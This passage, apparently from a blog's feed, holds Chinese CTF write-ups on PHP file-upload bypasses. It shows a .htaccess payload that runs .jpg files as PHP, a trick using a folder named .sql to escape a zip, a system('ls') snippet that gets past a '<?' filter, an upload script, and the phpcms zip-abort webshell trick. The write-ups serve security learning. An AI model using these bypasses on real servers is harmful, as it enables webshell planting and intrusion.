keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"这个文件不好，我不喜欢"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>可以用burpsuite抓包改后缀，也可以直接把js代码删掉绕过。<br>尝试传php文件，发现后端有检测，绕过方法一般是利用服务器的解析漏洞，发现后端为Apache，利用.htaccess即可，重新尝试上传，发现<code>&lt;?</code>也被ban掉。最开始想用<code>&lt;script&gt;</code>标签绕过，发现php版本过高，无法利用。然后尝试用base64编码绕过，在.htaccess文件中进行解码，发现无法调用一些命令，RCE失败。<br>最后payload</p><pre class=" language-.htaccess"><code class="language-.htaccess">AddType application/x-httpd-php .jpgphp_value auto_append_file /flag</code></pre><p>传入1.jpg（空文件即可），传入.htaccess，访问1.jpg即可得到flag。<br>得到flag：Dest0g3{b08c9b07-9235-4f1d-b6c9-53499fdbad03}</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含 文件上传 RCEbypass PHP代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022TSCTF ezphpaudit 学习</title>
      <link href="/2022/05/19/2022TSCTF%20ezphpaudit%20%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/05/19/2022TSCTF%20ezphpaudit%20%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="2022TSCTF-ezphpaudit-学习"><a href="#2022TSCTF-ezphpaudit-学习" class="headerlink" title="2022TSCTF ezphpaudit 学习"></a>2022TSCTF ezphpaudit 学习</h1><h2 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h2><p>打开环境，F12发现提示?source，尝试输入?source=index.php，发现源码，进行代码审计。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">echo</span> <span class="token string">"&lt;!--?source-->"</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#传参$res = fzip_open($f_path, $tagdir);</span><span class="token shell-comment comment">#把zip解压到tagdir中</span><span class="token keyword">function</span> <span class="token function">fzip_open</span><span class="token punctuation">(</span><span class="token variable">$fzip</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$tagdir</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token shell-comment comment">#检测是否存在文件和目录</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$fzip</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$tagdir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token shell-comment comment">#定义一个ZipArchive类</span>        <span class="token variable">$zip</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ZipArchive</span><span class="token punctuation">;</span>        <span class="token keyword">try</span><span class="token punctuation">{</span>            <span class="token shell-comment comment">#打开zip</span>            <span class="token variable">$status</span> <span class="token operator">=</span> <span class="token variable">$zip</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$fzip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token shell-comment comment">#extractTO 将压缩包解压到指定文件$zip->extractTo(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>这里解压到tagdir中            <span class="token variable">$status</span> <span class="token operator">=</span> <span class="token variable">$zip</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">extractTo</span><span class="token punctuation">(</span><span class="token variable">$tagdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token shell-comment comment">#关闭zip</span>            <span class="token variable">$zip</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token variable">$status</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>Exception <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token shell-comment comment">#$f_path= $userdir.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">;</span><span class="token shell-comment comment">#$userdir = </span><span class="token string">"./sandbox/user_"</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">;</span><span class="token shell-comment comment">#$tagdir = $userdir . </span><span class="token string">'tmp_'</span> <span class="token punctuation">.</span> <span class="token variable">$random</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">;</span><span class="token shell-comment comment">#moveSqlFile($tagdir, $userdir);传参</span><span class="token keyword">function</span> <span class="token function">moveSqlFile</span><span class="token punctuation">(</span><span class="token variable">$old_path</span><span class="token punctuation">,</span> <span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token shell-comment comment">#打开一个目录，读取它的内容，然后关闭。成功则返回目录句柄资源。失败则返回 FALSE。</span>    <span class="token variable">$handle</span> <span class="token operator">=</span> <span class="token function">opendir</span><span class="token punctuation">(</span><span class="token variable">$old_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token shell-comment comment">#readdir() 函数返回目录中下一个文件的文件名。</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">false</span> <span class="token operator">!==</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">readdir</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">==</span> <span class="token string">'.'</span> <span class="token operator">||</span> <span class="token variable">$file</span> <span class="token operator">==</span> <span class="token string">'..'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>·       <span class="token shell-comment comment">#截取后四位字符</span>        <span class="token variable">$substr</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$substr</span> <span class="token operator">===</span> <span class="token string">'.sql'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">rename</span><span class="token punctuation">(</span><span class="token variable">$old_path</span> <span class="token punctuation">.</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$target_path</span> <span class="token punctuation">.</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">closedir</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$old_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token shell-comment comment">#删除old_path</span>        <span class="token function">deldir</span><span class="token punctuation">(</span><span class="token variable">$old_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">deldir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//先删除目录下的文件：</span>    <span class="token variable">$dh</span> <span class="token operator">=</span> <span class="token function">opendir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">readdir</span><span class="token punctuation">(</span><span class="token variable">$dh</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!=</span> <span class="token string">"."</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$file</span><span class="token operator">!=</span><span class="token string">".."</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$fullpath</span> <span class="token operator">=</span> <span class="token variable">$dir</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$fullpath</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$fullpath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token function">deldir</span><span class="token punctuation">(</span><span class="token variable">$fullpath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">closedir</span><span class="token punctuation">(</span><span class="token variable">$dh</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//删除当前文件夹：</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">rmdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$userdir</span> <span class="token operator">=</span> <span class="token string">"./sandbox/user_"</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$tmp_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token shell-comment comment">#返回后缀名</span>    <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#strops查找最后一次出现的位置，对大小写敏感</span>    <span class="token variable">$f_path</span><span class="token operator">=</span> <span class="token variable">$userdir</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token shell-comment comment">#返回后缀名</span>    <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token shell-comment comment">#检测后缀名是否含有ph</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/ph/i"</span><span class="token punctuation">,</span><span class="token variable">$extension</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"No Hacker"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token shell-comment comment">#mb_strpos查找一个字符在字符串中首次出现的位置</span>    <span class="token shell-comment comment">#下面的语句ban掉了&lt;?</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'&lt;?'</span><span class="token punctuation">)</span><span class="token operator">!==</span>False<span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"No Hacker"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token shell-comment comment">#将上传的文件移动到目录下</span>    @<span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">,</span> <span class="token variable">$f_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token shell-comment comment">#输出目录</span>    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$f_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token shell-comment comment">#如果后缀是zip</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$extension</span> <span class="token operator">==</span> <span class="token string">'zip'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$patten</span> <span class="token operator">=</span> <span class="token string">"0123456789abcdef"</span><span class="token punctuation">;</span><span class="token shell-comment comment">#16位</span>        <span class="token variable">$random</span> <span class="token operator">=</span>  <span class="token string">''</span><span class="token punctuation">;</span>        <span class="token shell-comment comment">#下面循环生成一个四位的十六进制数</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$random</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token shell-comment comment">#从0-16随机生成一个数</span>                <span class="token variable">$rand</span> <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$patten</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token shell-comment comment">#换为16进制</span>                <span class="token variable">$random</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$patten</span><span class="token punctuation">,</span> <span class="token variable">$rand</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token shell-comment comment">#$f_path= $userdir.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token shell-comment comment">#$userdir = </span><span class="token string">"./sandbox/user_"</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">;</span>        <span class="token variable">$tagdir</span> <span class="token operator">=</span> <span class="token variable">$userdir</span> <span class="token punctuation">.</span> <span class="token string">'tmp_'</span> <span class="token punctuation">.</span> <span class="token variable">$random</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">;</span>        <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$tagdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token shell-comment comment">#调用上面的函数，要求返回值为真</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">fzip_open</span><span class="token punctuation">(</span><span class="token variable">$f_path</span><span class="token punctuation">,</span> <span class="token variable">$tagdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token shell-comment comment">#调用上面的含数，想办法利用</span>            <span class="token function">moveSqlFile</span><span class="token punctuation">(</span><span class="token variable">$tagdir</span><span class="token punctuation">,</span> <span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span> </code></pre><p>简单来说，是要利用.sql的后缀将zip文件中的东西逃逸出来，同时ban掉了php和<code>&lt;?</code>。<br>先考虑逃逸的问题，最初想要利用<code>::$DATA</code>等来让服务器解析为.php，用了很多的方法都没有成功绕过后缀.sql。<br>发现当文件夹名后四位为.sql时，也会逃逸出来。于是命名文件夹为.sql，在文件夹里面放上php脚本，成功将脚本打出zip。<br>接下来解决<code>&lt;?</code>的问题，最初考虑使用<code>&lt;script&gt;</code>标签绕过，发现PHP7以上版本将该方法禁用了。<br>后面考虑将PHP脚本进行base64编码，然后通过.htaccess配置文件将其解码，但尝试后发现，网站为nginx模板，.htaccess没法使用，同时同目录下也没有可用的php文件，没法使用.user.ini绕过。<br>搜file_get_contents源码</p><pre class=" language-1"><code class="language-1">//file.c (ext\standard) line 523 : PHP_FUNCTION(file_get_contents)PHP_FUNCTION(file_get_contents){//省略好多stream = php_stream_open_wrapper_ex(filename, "rb",                (use_include_path ? USE_PATH : 0) | REPORT_ERRORS,                NULL, context);//省略好多}</code></pre><p>发现file_get_contents是以二进制的形式将文件写入的，猜测可以用二进制编码绕过，在本地尝试</p><pre class=" language-python"><code class="language-python">f <span class="token operator">=</span> open<span class="token punctuation">(</span>r<span class="token string">'C:\Users\Kingkb\Desktop\test.zip'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>a<span class="token operator">=</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span></code></pre><p>发现一般情况下文件都是按字符读取的，但是当内容为</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token comment" spellcheck="true">/*test*/</span> <span class="token comment" spellcheck="true">/*test*/</span> <span class="token comment" spellcheck="true">/*test*/</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>的时候，文件会以二进制的形式打开，从而绕过了&lt;?的判断。<br>发包payload：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://10.7.2.148/'</span>files <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'file'</span><span class="token punctuation">:</span> open<span class="token punctuation">(</span>r<span class="token string">'C:\Users\Kingkb\Desktop\test.zip'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">#data = {'xxx': xxx, 'xxx': xxx}</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><h2 id="赛题学习"><a href="#赛题学习" class="headerlink" title="赛题学习"></a>赛题学习</h2><p>以下摘自p神博客：<a href="https://www.leavesongs.com/PENETRATION/after-phpcms-upload-vul.html">回忆phpcms头像上传漏洞以及后续影响</a><br>主要见0x03处的分析。<br>源码：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// 创建图片存储的临时文件夹</span>   <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token constant">FCPATH</span><span class="token punctuation">.</span><span class="token string">'cache/attach/'</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span>   <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$temp</span><span class="token punctuation">.</span><span class="token string">'avatar.zip'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 存储flashpost图片</span>   <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">'HTTP_RAW_POST_DATA'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// 解压缩文件</span>   <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">load</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">library</span><span class="token punctuation">(</span><span class="token string">'Pclzip'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">pclzip</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">PclFile</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">pclzip</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token constant">PCLZIP_OPT_PATH</span><span class="token punctuation">,</span> <span class="token variable">$temp</span><span class="token punctuation">,</span> <span class="token constant">PCLZIP_OPT_REPLACE_NEWER</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token function">exit</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">pclzip</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">zip</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span>   @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>其中一段代码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">pclzip</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token constant">PCLZIP_OPT_PATH</span><span class="token punctuation">,</span> <span class="token variable">$dir</span><span class="token punctuation">,</span> <span class="token constant">PCLZIP_OPT_REPLACE_NEWER</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">pclzip</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">zip</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>当解压发生失败时，就退出解压缩过程。<br>这也是一个很平常的思路，失败了肯定要报错并退出，因为后面的代码没法运行了。但是，程序员不会想到，有些压缩包能在解压到一半的时候出错。<br>什么意思，也就说我可以构造一个“出错”的压缩包，它可以解压出部分文件，但绝对会在解压未完成时出错。这是造成了一个状况：我上传的压缩包被解压了一半，webshell被解压出来了，但因为解压失败这里exit($this-&gt;pclzip-&gt;zip(true));退出了程序执行，后面一切的删除操作都没有了作用。<br>根据源码逻辑可以分析出我们的目标是让zip包解压出错，然后让访问解压一半出来的文件。</p><p>这里利用的trick就是在linux下，zip中文件名为/////会导致解压报错，只要构造一个1.php+/////的压缩包，就可以让1.php保留下来，因为报错而无法执行删除动作。</p><p>注意要用hex编辑器对文件进行重命名，推荐使用010editor，<a href="https://blog.csdn.net/weixin_43272781/article/details/100750186">下载方式</a></p><p>随便新建一个文件夹，里面放入php脚本和一个随意的文件，以1.txt为例。<br><img src="https://kingofkb.github.io/medias/image/20220519/open.png" alt="open"><br>修改后保存<br><img src="https://kingofkb.github.io/medias/image/20220519/change.png" alt="change"><br>尝试解压<br><img src="https://kingofkb.github.io/medias/image/20220519/error.png" alt="error"><br>最后得到的文件夹<br><img src="https://kingofkb.github.io/medias/image/20220519/get.png" alt="get"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 zip解压漏洞 hex编码编辑器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSTI模板注入汇总</title>
      <link href="/2022/04/20/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"/>
      <url>/2022/04/20/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
      
